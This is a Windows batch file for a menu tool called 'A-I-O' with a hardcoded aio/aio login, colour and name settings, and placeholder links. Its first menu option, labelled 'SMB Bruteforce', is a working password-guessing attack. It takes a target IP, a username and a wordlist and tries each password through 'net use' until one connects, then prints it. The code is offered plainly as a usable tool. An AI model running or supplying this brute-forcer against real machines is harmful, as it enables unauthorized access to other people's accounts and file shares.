@echo off
setlocal enabledelayedexpansion
title A-I-O Menu

:: Default login credentials
set default_user=aio
set default_pass=aio
set username=%default_user%
set password=%default_pass%
set color=07
set name=User
set version=1.0

:login
cls
echo ==============================
echo          A-I-O Login
echo ==============================
set /p input_user="Enter Username: "
set /p input_pass="Enter Password: "

:: Correctly compare the username and password
if "%input_user%"=="%username%" (
    if "%input_pass%"=="%password%" (
        goto home
    ) else (
        echo Invalid Password. Please try again.
        pause
        goto login
    )
) else (
    echo Invalid Username. Please try again.
    pause
    goto login
)

:home
cls
color %color%
echo ===================================
echo.
echo  ##     #####   #####
echo #  #      #    #     #
echo ######    #    #     #
echo #    #    #    #     #
echo #    #  #####   #####
echo.
echo.         Welcome, %name%!
echo ===================================
echo 1. Run Script 1
echo 2. Run Script 2
echo 3. Settings
echo 4. Visit Our GitHub Page
echo 5. Help
echo 6. Log Out
echo 7. Exit
echo ===================================
set /p choice="Choose an option: "

if "%choice%"=="1" goto script1
if "%choice%"=="2" goto script2
if "%choice%"=="3" goto settings
if "%choice%"=="4" goto visit_github
if "%choice%"=="5" goto help
if "%choice%"=="6" goto logout
if "%choice%"=="7" exit

goto home

:script1
cls
echo Running Script 1...
title SMB Bruteforce - by Elisha
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter username: "
set /p wordlist="Enter password list: "

set /a count=0
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not found :(
pause
goto home

:success
echo.
echo Password found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto home

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%]: [%pass%]
set /a count+=1
if %errorlevel% EQU 0 goto success

goto :EOF

:script2
cls
echo Running Script 2...
:: Place the commands for your second script here
pause
goto home

:settings
cls
echo ===== Settings =====
echo 1. Change Color
echo 2. Change Name
echo 3. How to Change Username and Password
echo 4. Check for Updates
echo 5. Back to Home
set /p setchoice="Choose an option: "

if "%setchoice%"=="1" goto change_color
if "%setchoice%"=="2" goto change_name
if "%setchoice%"=="3" goto change_credentials_instructions
if "%setchoice%"=="4" goto check_updates
if "%setchoice%"=="5" goto home

goto settings

:change_color
cls
echo Choose a color (0-9, A-F):
echo 0 = Black, 1 = Blue, 2 = Green, 3 = Aqua, 4 = Red
echo 5 = Purple, 6 = Yellow, 7 = White, 8 = Gray, 9 = Light Blue
echo A = Light Green, B = Light Aqua, C = Light Red, D = Light Purple, E = Light Yellow, F = Bright White
set /p newcolor="Enter the color code: "
set color=%newcolor%
cls
echo Color changed to %newcolor%.
echo Changes will apply when you return to the home screen.
pause
goto settings

:change_name
cls
set /p newname="Enter your name: "
set name=%newname%
cls
echo Name changed to %newname%.
echo Changes will apply when you return to the home screen.
pause
goto settings

:change_credentials_instructions
cls
echo ===== Instructions: Changing Username and Password =====
echo 1. Open this batch file in a text editor (like Notepad).
echo 2. Look for the following lines near the top:
echo.
echo set default_user=aio
echo set default_pass=aio
echo.
echo 3. Change "aio" to your desired username and password.
echo 4. Save the file and restart the script.
echo.
pause
goto settings

:check_updates
cls
echo You are using version %version%.
echo.
echo Type 1 to open the website to check for updates or any other key to return to settings.
set /p updatechoice="Choose an option: "

if "%updatechoice%"=="1" (
    start https://your-update-check-url.com
)

goto settings

:visit_github
start https://github.com/your-username/your-repository
goto home

:help
cls
echo ===== Help Menu =====
echo If you want to add your own code to the main menu:
echo 1. Open this batch file in a text editor.
echo 2. Scroll to where it says echo followed by a number and a name.
echo 3. For example: echo 6. Your Own Code
echo 4. Add the next number in the sequence, followed by your code's description.
echo.
echo After that:
echo 5. Scroll down below where you see similar entries, like this:
echo if "%%choice%%"=="6" goto your_custom_script
echo 6. Then create a label with :your_custom_script below.
echo 7. Add your custom script logic there.
echo.
echo Example:
echo echo 6. Your Own Code
echo if "%%choice%%"=="6" goto your_custom_script
echo :your_custom_script
echo echo Running your custom script...
echo pause
echo goto home
echo.
pause
goto home

:logout
:: Return to login screen
goto login
